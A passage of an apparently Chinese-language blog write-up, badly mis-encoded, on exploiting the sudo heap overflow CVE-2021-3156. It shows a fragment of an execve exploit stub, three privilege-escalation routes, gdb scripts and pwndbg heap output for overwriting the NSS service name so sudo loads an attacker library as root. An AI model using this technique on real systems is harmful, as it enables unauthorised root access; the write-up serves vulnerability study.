class="literal">NULL</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">execve(args[<span class="number">0</span>], args, extra_args);</span><br><span class="line"></span><br><span class="line"><span class="comment">// execvpe(&quot;./sudoedit&quot;, args, extra_args);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´äº§ç”Ÿçš„ä»£ç ä½äº <code>plugins/sudoers/sudoers.c</code>  çš„ <code>set_cmnd</code> å‡½æ•°</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201141621764.png" title="image-20210201141621764" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201141621764.png" alt="image-20210201141621764"></a></p><p>é¦–å…ˆé€šè¿‡ 854 å¤„ï¼Œä¸º <code>sudoedit</code>  <code>-s</code>  åçš„å­—ç¬¦é•¿åº¦åˆ†é…å†…å­˜ç©ºé—´ï¼Œ å³ <code>user_args</code>,  å½“ä»£ç å¤„ç†åˆ° 866 å¤„çš„æ—¶å€™ï¼Œ å¦‚æœå‚æ•°ä¸ºå¦‚ä¸‹ç»“æ„ï¼Œå³</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p NewArgv[0]</span><br><span class="line">$4 &#x3D; 0x55555557183e &quot;sudoedit&quot;</span><br><span class="line">pwndbg&gt; p NewArgv[1]</span><br><span class="line">$5 &#x3D; 0x7fffffffee13 &quot;BBBBBB\\&quot;</span><br><span class="line">pwndbg&gt; p NewArgv[2]</span><br><span class="line">$6 &#x3D; 0x0</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡æ‹·è´ ä¼šå°† <code>B</code> æ‹·è´åˆ° <code>user_args</code> é‡Œï¼Œç„¶å from ++ </p><p>å½“ <code>B</code> æ‹·è´å®Œï¼Œ <code>from[0] == &#39;\\&#39;</code> ï¼Œ ä¸”<code>from[1]</code> ä¸ä¸ºç©ºçš„æ—¶å€™ï¼Œ æ­¤æ—¶ from ++ , ç„¶ååˆè¿›åˆ°è¿™ä¸ª while å¾ªç¯ï¼Œ from åé¢çš„æ•°æ®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p from[0]</span><br><span class="line">$3 &#x3D; 92 &#39;\\&#39;</span><br><span class="line">pwndbg&gt; p from[1]</span><br><span class="line">$4 &#x3D; 0 &#39;\000&#39;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™ from åé¢çš„æ•°æ®ä¸ºç¯å¢ƒå˜é‡è®¾ç½®çš„æ•°æ®, å³è¿™é‡Œæ­¤æ—¶ <code>from[0]</code> ä¸º <code>X/X</code> ã€‚æœ€ç»ˆç»“æœå°±æ˜¯ <code>user_args</code> è¢«è¶Šç•Œ</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h4 id="ä¸‰ç§åˆ©ç”¨æ€è·¯"><a href="#ä¸‰ç§åˆ©ç”¨æ€è·¯" class="headerlink" title="ä¸‰ç§åˆ©ç”¨æ€è·¯"></a>ä¸‰ç§åˆ©ç”¨æ€è·¯</h4><p>åŸä½œè€…çš„æåˆ°äº†ï¼Œ ä»–ä»¬é€šè¿‡éšæœºæ·»åŠ  <code>LC_*</code> ç­‰ç¯å¢ƒå˜é‡æ¥é£æ°´å †å¸ƒå±€ï¼Œ äº§ç”Ÿäº†æ•°åç§ crash æ ·æœ¬ï¼Œå…¶ä¸­æœ‰ä¸‰ç§åˆ©ç”¨æ€è·¯ï¼Œ</p><p>ï¼ˆ1ï¼‰é€šè¿‡è¦†å†™ <code>sudo_hook_entry</code>  ç»“æ„ä½“</p><pre><code>è¯¥éƒ¨åˆ†ä»£ç ä½äº `src/hooks.c`  107è¡Œ ï¼Œ æ€»ä½“æ€è·¯ä¸º é€šè¿‡å †æº¢å‡ºï¼ŒåŠ«æŒå‡½æ•°æŒ‡é’ˆgetenv_fn çš„ä½ä¸¤ä½ï¼Œ é€šè¿‡çˆ†ç ´çš„æ–¹æ³•å°†å‡½æ•°åŠ«æŒåˆ° `execv` æ¥æ‰§è¡Œæˆ‘ä»¬çš„ç¨‹åºã€‚ è¯¥æ€è·¯å·²ç»æœ‰å…¬å¼€çš„åˆ©ç”¨ä»£ç ,  å¯è§[Github](https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156)</code></pre><p>   (2)  é€šè¿‡è¦†å†™ <code>service_user</code> ç»“æ„ä½“</p><pre><code>è¯¥éƒ¨åˆ†ä»£ç ä½äº glibc æºä»£ç ä¸­çš„ `glibc-2.31/nss/nsswitch.c` çš„330 è¡Œï¼Œ </code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">327</span> <span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line"><span class="number">328</span> nss_load_library (service_user *ni)</span><br><span class="line"><span class="number">329</span> &#123;</span><br><span class="line"><span class="number">330</span>   <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">331</span>     &#123;</span><br><span class="line">...</span><br><span class="line"><span class="number">338</span>       ni-&gt;library = nss_new_service (service_table ?: &amp;default_table,</span><br><span class="line"><span class="number">339</span>                                      ni-&gt;name);</span><br><span class="line">...</span><br><span class="line"><span class="number">342</span>     &#125;</span><br><span class="line"><span class="number">343</span> </span><br><span class="line"><span class="number">344</span>   <span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">345</span>     &#123;</span><br><span class="line"><span class="number">346</span>       <span class="comment">/* Load the shared library.  */</span></span><br><span class="line"><span class="number">347</span>       <span class="keyword">size_t</span> shlen = (<span class="number">7</span> + <span class="built_in">strlen</span> (ni-&gt;name) + <span class="number">3</span></span><br><span class="line"><span class="number">348</span>                       + <span class="built_in">strlen</span> (__nss_shlib_revision) + <span class="number">1</span>);</span><br><span class="line"><span class="number">349</span>       <span class="keyword">int</span> saved_errno = errno;</span><br><span class="line"><span class="number">350</span>       <span class="keyword">char</span> shlib_name[shlen];</span><br><span class="line"><span class="number">351</span> </span><br><span class="line"><span class="number">352</span>       <span class="comment">/* Construct shared object name.  */</span></span><br><span class="line"><span class="number">353</span>       __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,</span><br><span class="line"><span class="number">354</span>                                               <span class="string">&quot;libnss_&quot;</span>),</span><br><span class="line"><span class="number">355</span>                                     ni-&gt;name),</span><br><span class="line"><span class="number">356</span>                           <span class="string">&quot;.so&quot;</span>),</span><br><span class="line"><span class="number">357</span>                 __nss_shlib_revision);</span><br><span class="line"><span class="number">358</span> </span><br><span class="line"><span class="number">359</span>       ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡è¦†ç›– <code>ni-&gt;name</code> ï¼Œè®©ç¨‹åºå» <code>___libc_dlopen</code> åŠ è½½æˆ‘ä»¬ç¼–å†™çš„ libc åº“ï¼Œ åœ¨åŠ ä¸Š <code>__attribute__ ((constructor))</code> çš„é­”æœ¯æ–¹æ³•ï¼Œæ¥è®©åŠ è½½ libc åç¬¬ä¸€æ—¶é—´æ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ï¼Œ</p><p>ï¼ˆ3ï¼‰é€šè¿‡è¦†å†™ <code>def_timestampdir </code>ç»“æ„ä½“</p><pre><code>å°†def_timestampdirè¦†ç›–ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½•ã€‚ç„¶åæˆ‘ä»¬å¯ä»¥ä¸sudoçš„`ts_mkdirs()`ç«äº‰ï¼Œåˆ›å»ºä¸€ä¸ªæŒ‡å‘ä»»æ„æ–‡ä»¶çš„ç¬¦å·é“¾æ¥ã€‚å¹¶ä¸”å°è¯•æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œå‘å…¶ä¸­å†™å…¥ä¸€ä¸ªstruct timestamp_entryã€‚æˆ‘ä»¬å¯ä»¥ç¬¦å·é“¾æ¥å°†å…¶æŒ‡å‘/etc/passwdï¼Œç„¶åä»¥rootæ‰“å¼€ä»–ï¼Œç„¶åå®ç°ä»»æ„ç”¨æˆ·çš„æ³¨å…¥ä»è€Œrootè¿™ä¸ªç±»ä¼¼çš„åˆ©ç”¨ä¼¼ä¹ä¹Ÿæœ‰ [Github](https://github.com/r4j0x00/exploits/blob/master/CVE-2021-3156/exploit.c)</code></pre><h4 id="ç¼–å†™åˆ©ç”¨"><a href="#ç¼–å†™åˆ©ç”¨" class="headerlink" title="ç¼–å†™åˆ©ç”¨"></a>ç¼–å†™åˆ©ç”¨</h4><p>è¿™é‡Œç®€å•æè¿°ä¸€ä¸‹ï¼Œæˆ‘ä¹‹å‰è°ƒè¯•ç¼–å†™åˆ©ç”¨ç¬¬äºŒç§æ–¹æ³•çš„è¿‡ç¨‹</p><p>é¦–å…ˆæˆ‘ä»¬çŸ¥é“äº† <code>sudo</code> ä»£ç ä¼šæ ¹æ®ç¯å¢ƒå˜é‡ä¸­çš„ <code>LC*</code> æ¥åˆ†é…é‡Šæ”¾å †å¸ƒå±€</p><blockquote><p>  in setlocale(), we malloc()ate and free() several LC  environment variables (LC_CTYPE, LC_MESSAGES, LC_TIME, etc), thereby creating small holes at   the very beginning of Sudoâ€™s heap (free fast or tcache chunks);</p></blockquote><p>å…¶æ¬¡ï¼Œæˆ‘ä»¬éœ€è¦æ˜ç¡®æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ï¼Œæˆ‘ä»¬è¦è®©åˆ†é…çš„ <code>user_args</code>  ç»“æ„ä½“ ä¸ <code>service_user</code> ç»“æ„ä½“ä¸¤è€…é—´çš„è·ç¦»è¶Šè¿‘è¶Šå¥½ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬é€šè¿‡ï¼ˆfuzz å’Œ æ‰‹åŠ¨è°ƒè¯•çš„æ–¹æ³•æ¥é£æ°´å †å¸ƒå±€ã€‚</p><p>é‚£ä¹ˆå¦‚ä½•åˆ¤æ–­ä¸¤è€…é—´çš„è·ç¦»å‘¢ï¼Ÿ é¦–å…ˆæˆ‘ä»¬å¯¹åˆ†é… <code>user_args</code> ä»£ç å¤„ä¸‹æ–­ï¼Œ å³ <code>b sudoers.c:854</code> , ç„¶åå¯¹ä½¿ç”¨ <code>service_user</code> å¤„ä¸‹æ–­ï¼Œï¼Œå³<code>b nsswitch.c:330</code> </p><p>ç”±äºæˆ‘ä»¬çš„åˆ©ç”¨æ˜¯é€šè¿‡ <code>execve</code> æ¥æ‰§è¡Œ <code>sudoedit</code> ï¼Œ å› æ­¤æˆ‘ä»¬è°ƒè¯•çš„æ˜¯æˆ‘ä»¬ç¼–å†™åˆ©ç”¨ç¨‹åºçš„å­è¿›ç¨‹ï¼Œå› æ­¤è¿˜éœ€è¦è®¾ç½®ä¸‹ gdb çš„è°ƒè¯•æ¨¡å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">catch exec</span><br><span class="line">set follow-exec-mode new</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±è¡Œäº†ï¼Œ æˆ‘å°†ä»¥ä¸Šä¸œè¥¿é›†æˆåˆ°ä¸€ä¸ª gdb è°ƒè¯•è„šæœ¬ä¸­ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">catch exec</span><br><span class="line">set follow-exec-mode new</span><br><span class="line">r</span><br><span class="line">b policy_check</span><br><span class="line">c</span><br><span class="line">b sudoers.c:854</span><br><span class="line">b nsswitch.c:330  </span><br></pre></td></tr></table></figure><p>ç„¶åæŒ‚ä¸Šè°ƒè¯•å™¨  <code>gdb exploit -x gdbscript</code> , æŸ¥çœ‹ä¸¤è€…åç§»,  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/swpwn/Desktop/CVE<span class="number">-2021</span><span class="number">-3156</span>/sudo-SUDO_1_8_31/plugins/sudoers/sudoers.c</span><br><span class="line">   <span class="number">849</span>     <span class="keyword">size_t</span> size, n;</span><br><span class="line">   <span class="number">850</span></span><br><span class="line">   <span class="number">851</span>     <span class="comment">/* Alloc and build up user_args. */</span></span><br><span class="line">   <span class="number">852</span>     <span class="keyword">for</span> (size = <span class="number">0</span>, av = NewArgv + <span class="number">1</span>; *av; av++)</span><br><span class="line">   <span class="number">853</span> size += <span class="built_in">strlen</span>(*av) + <span class="number">1</span>;</span><br><span class="line"> â–º <span class="number">854</span>     <span class="keyword">if</span> (size == <span class="number">0</span> || (user_args = <span class="built_in">malloc</span>(size)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">   <span class="number">855</span> sudo_warnx(U_(<span class="string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line">   <span class="number">856</span> debug_return_int(<span class="number">-1</span>);</span><br><span class="line">   <span class="number">857</span>     &#125;</span><br><span class="line">   <span class="number">858</span>     <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class="line">   <span class="number">859</span> <span class="comment">/*</span></span><br><span class="line"><span class="comment">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK </span></span><br><span class="line"><span class="comment">pwndbg&gt; bins</span></span><br><span class="line"><span class="comment">tcachebins</span></span><br><span class="line"><span class="comment">0x20 [  3]: 0x55555557ebc0 â€”â–¸ 0x5555555975c0 â€”â–¸ 0x55555558f0a0 â—‚â€” 0x0</span></span><br><span class="line"><span class="comment">0x40 [  1]: 0x555555586700 â—‚â€” 0x0</span></span><br><span class="line"><span class="comment">0x70 [  1]: 0x55555558f620 â—‚â€” 0x0</span></span><br><span class="line"><span class="comment">0x80 [  1]: 0x555555586680 â—‚â€” 0x0</span></span><br><span class="line"><span class="comment">0x90 [  1]: 0x555555586b60 â—‚â€” 0x0</span></span><br><span class="line"><span class="comment">0x110 [  1]: 0x555555597480 â—‚â€” 0x0</span></span><br><span class="line"><span class="comment">0x190 [  1]: 0x555555584820 â—‚â€” 0x0</span></span><br><span class="line"><span class="comment">0x1a0 [  1]: 0x5555555896d0 â—‚â€” 0x0</span></span><br><span class="line"><span class="comment">0x1e0 [  1]: 0x55555558f440 â—‚â€” 0x0</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>tcachebins</code> æ˜¯æˆ‘ä»¬å³å°†åˆ†é…çš„ <code>user_args</code> chunkï¼Œå…·ä½“åˆ†é…æ˜¯å“ªä¸ªï¼Œ å–å†³äº <code>user_args</code> çš„å¤§å°ï¼Œ ç„¶åå† c ä¸€ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/swpwn/glibc<span class="number">-2.31</span>/nss/nsswitch.c</span><br><span class="line">   <span class="number">325</span> <span class="meta">#<span class="meta-keyword">if</span> !defined DO_STATIC_NSS || defined SHARED</span></span><br><span class="line">   <span class="number">326</span> <span class="comment">/* Load library.  */</span></span><br><span class="line">   <span class="number">327</span> <span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">   <span class="number">328</span> nss_load_library (service_user *ni)</span><br><span class="line">   <span class="number">329</span> &#123;</span><br><span class="line"> â–º <span class="number">330</span>   <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line">   <span class="number">331</span>     &#123;</span><br><span class="line">   <span class="number">332</span>       <span class="comment">/* This service has not yet been used.  Fetch the service</span></span><br><span class="line"><span class="comment">   333  library for it, creating a new one if need be.  If there</span></span><br><span class="line"><span class="comment">   334  is no service table from the file, this static variable</span></span><br><span class="line"><span class="comment">   335  holds the head of the service_library list made from the</span></span><br><span class="line"><span class="comment">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span></span><br><span class="line"><span class="comment">pwndbg&gt; p ni</span></span><br><span class="line"><span class="comment">$1 = (service_user *) 0x555555582c20</span></span><br><span class="line"><span class="comment">pwndbg&gt;</span></span><br></pre></td></tr></table></figure><p>è·å– <code>ni</code> çš„åœ°å€ï¼Œ ä¸ä¸Šé¢çš„ <code>tcachebins</code> è¿›è¡Œæ¯”è¾ƒï¼Œ è¶Šè¿‘è¶Šå¥½ï¼Œ æˆ‘æœ€åˆçš„åˆ©ç”¨è„šæœ¬ä¸¤è€…åç§»æœ€å°ä¸º 0x700 å·¦å³ï¼Œç„¶åä¸­é—´ä¸€è·¯è¦†ç›–è¿‡å»</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201152543462.png" title="image-20210201152543462" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201152543462.png" alt="image-20210201152543462"></a></p><p>å°† <code>ni-&gt;name</code> è¦†ç›–ä¸º â€œX/Xâ€ ,å…¶ä½™å†…å®¹ä»¥ <code>\0</code> è¦†ç›–ï¼Œè¿™é‡Œä¼šæ¶‰åŠä¸€ä¸ªé—®é¢˜ï¼Œé‚£ä¹ˆå°±æ˜¯å¦‚ä½•ä¼ å…¥<code>\00</code> å­—ç¬¦å‘¢ï¼Ÿ æˆ‘ä»¬çŸ¥é“ å‚æ•°å’Œç¯å¢ƒå˜é‡éƒ½æ˜¯ä¸å…è®¸å†™å…¥ <code>\x00</code>çš„ï¼Œå¦åˆ™å°†è¢«æˆªæ–­ã€‚é€šè¿‡é˜…è¯»ä»£ç å’Œè°ƒè¯•æˆ‘ä»¬æœ€ç»ˆå‘ç° æˆ‘ä»¬å¯ä»¥å•ç‹¬çš„ <code>\\</code> å­—ç¬¦æ¥ä½œä¸ºä¸€ä¸ª <code>\x00</code> å­—ç¬¦ã€‚</p><p>æœ€åæåŠä¸€ä¸‹ï¼Œéæºç è°ƒè¯•çš„æ–¹æ³•ï¼Œå› ä¸ºå½“æˆ‘ç¼–å†™åˆ©ç”¨åï¼Œåœ¨æœ¬åœ°æ‰§è¡Œæ˜¯æˆåŠŸäº†ï¼Œä½†æ˜¯æ¢äº†ä¸€ä¸ªæœºå™¨ï¼Œå³éç¼–è¯‘çš„ sudo çš„ç¨‹åºæ‰§è¡Œçš„æ—¶å€™å´ï¼Œå¤±è´¥äº†ï¼Œè¿™ä¸ªæ—¶å€™å‘ç°è‡ªå·±ç¼–è¯‘çš„å’Œç³»ç»Ÿè‡ªå¸¦è¿˜æ˜¯ä¸ä¸€æ ·çš„ï¼Œäºæ˜¯æˆ‘åˆå†™äº†ä¸€ä¸ªä¸æ˜¯è‡ªå·±ç¼–è¯‘çš„åˆ©ç”¨ã€‚</p><p>å½“éæºç è°ƒè¯•çš„æ—¶å€™ï¼Œç”±äºæ¼æ´å‡½æ•°æ˜¯ä½äº <code>sudoers.so</code>ä¸­ï¼Œè¯¥ so åº“å¹¶ä¸æ˜¯ä¸€å¼€å§‹å°±åŠ è½½çš„ï¼Œæˆ‘ä»¬æ²¡æ³•åœ¨æ²¡æœ‰ç¬¦å· å’Œ æ²¡æœ‰åŠ è½½çš„æƒ…å†µä¸‹ç›´æ¥ä¸‹æ–­ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æˆ‘ä»¬çš„ <code>payload</code> è®¾ç½®ä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦ï¼Œ æ¯”å¦‚ <code>0xdeadbeaf</code> æ¯”å¦‚æˆ‘è¿™é‡Œè®¾ç½®ä¸€ä¸ªå•ç‹¬çš„è®¾ç½® args å‚æ•°ä¸º â€BBBBBBâ€</p><p>ä»¥åŠæˆ‘ä»¬å†é€‰æ‹©å¯¹ libc ä¸­çš„ <code>__libc_dlopen_mode</code> å‡½æ•°ä¸‹æ–­ï¼Œå› ä¸ºæˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„æ˜¯ dlopen æˆ‘ä»¬çš„ç›®æ ‡ so ç¨‹åºï¼Œä»¥åŠä¸‹åˆ°è¿™ä¸ªï¼Œä¹Ÿç›¸å½“äºåˆ°äº† nss_load å‡½æ•°é™„è¿‘äº†ã€‚</p><p>ä½†æ˜¯å¯¹è¿™ä¸ª<code> __libc_dlopen_mode</code> å¯èƒ½éœ€è¦ glibc çš„è°ƒè¯•ç¬¦å·ï¼Œå¯ä»¥é€šè¿‡ <code>apt install libc6-dbg</code>  æ¥å®‰è£…ï¼Œä»¥åŠä¸‹æ–­éœ€è¦å¼€å¯ <code>Pending Breakpoints</code> åŠŸèƒ½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># cat gdbscript</span><br><span class="line">catch exec</span><br><span class="line">set breakpoint pending on</span><br><span class="line">set follow-exec-mode new</span><br><span class="line">r</span><br><span class="line">b __libc_dlopen_mode</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ <code>gdb ./exploit -x gdbscript</code></p><p>c ä¸€æ¬¡ï¼Œ æ–­åˆ° <code>__libc_dlopen_mode</code> è¿™æ˜¯ç¬¬ä¸€æ¬¡ sudo åœ¨æ‰§è¡Œ <code>set_cmnd</code> ä¹‹å‰ <code>getpwuid</code> çš„ nss_load æ“ä½œ</p><p>å† c ä¸€æ¬¡ ï¼Œ è¿™ä¸ªå°±æ˜¯ <code>set_cmnd</code> ä¹‹åå°±çš„ nss_load , æ­¤æ—¶å°±æ˜¯æº¢å‡ºä¹‹åçš„ï¼Œ æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>search BBBB</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search &quot;BBBB&quot;</span><br><span class="line">[heap]          0x555555588bc0 0x4242424242424242 (&#39;BBBBBBBB&#39;)</span><br><span class="line">[heap]          0x555555588bc4 0x4242424242424242 (&#39;BBBBBBBB&#39;)</span><br><span class="line">[heap]          0x555555588bc8 0x4242424242424242 (&#39;BBBBBBBB&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¥çœ‹æˆ‘ä»¬åˆ†é…çš„å †çš„ä½ç½®</p><p>ä»¥åŠæŸ¥çœ‹æ­¤æ—¶çš„å¯„å­˜å™¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">*RAX  0x7fffffffb2ea â—‚â€” 0x336a00322e6f732e &#x2F;* &#39;.so.2&#39; *&#x2F;</span><br><span class="line">*RBX  0x555555585df0 â€”â–¸ 0x5555555891e0 â—‚â€” 0x4300206100582f58 &#x2F;* &#39;X&#x2F;X&#39; *&#x2F;</span><br><span class="line"> RCX  0x322e</span><br><span class="line">*RDX  0x582f58</span><br><span class="line">*RDI  0x7fffffffb2e0 â—‚â€” &#39;libnss_X&#x2F;X.so.2&#39;</span><br><span class="line"> RSI  0x80000002</span><br><span class="line">*R8   0x555555585df0 â€”â–¸ 0x5555555891e0 â—‚â€” 0x4300206100582f58 &#x2F;* &#39;X&#x2F;X&#39; *&#x2F;</span><br><span class="line">*R9   0x7fffffffb1f0 â—‚â€” 0x0</span><br><span class="line">*R10  0x10</span><br><span class="line"> R11  0x7ffff7f37be0 (main_arena+96) â€”â–¸ 0x5555555a06e0 â—‚â€” 0x0</span><br><span class="line">*R12  0x5555555891b0 â—‚â€” 0x0</span><br><span class="line">*R13  0x5555555891e0 â—‚â€” 0x4300206100582f58 &#x2F;* &#39;X&#x2F;X&#39; *&#x2F;</span><br><span class="line">*R14  0x7fffffffb2f0 â€”â–¸ 0x7ffff7f0336a â—‚â€” 0x6225206125000200</span><br><span class="line">*R15  0x16</span><br><span class="line">*RBP  0x7fffffffb340 â€”â–¸ 0x7fffffffb3a0 â—‚â€” 0x0</span><br><span class="line">*RSP  0x7fffffffb2d8 â€”â–¸ 0x7ffff7e9262c (nss_load_library+364) â—‚â€” mov    r10, qword ptr [rbp - 0x48]</span><br><span class="line"> RIP  0x7ffff7eae930 (__libc_dlopen_mode) â—‚â€” endbr64 </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>0x5555555891e0 